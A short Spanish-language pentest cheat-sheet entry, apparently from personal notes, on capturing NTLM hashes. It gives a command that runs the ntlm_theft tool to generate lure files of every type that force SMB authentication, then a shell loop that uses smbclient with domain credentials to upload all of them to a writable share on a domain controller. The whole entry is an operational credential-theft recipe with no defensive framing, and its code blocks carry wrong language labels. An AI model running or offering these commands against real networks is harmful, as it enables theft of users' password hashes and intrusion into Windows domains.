
# ntlm_theft

Debemos crear multiples archivos de diferentes tipos que tengan la capacidad de enviar peticiones smb y asi podamos obtener hashes NTLM, para esto podemos usar [esta](https://github.com/Greenwolf/ntlm_theft) herramienta 

```ruby
python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
```

# Subir archivos 

```python
for x in *; do smbclient  //[IP_DC]/[WRITABLE_SHARE] -U '[DOMAIN]/[USER]%[PASSWORD]' -c "PROMPT off; put $x"; done
```






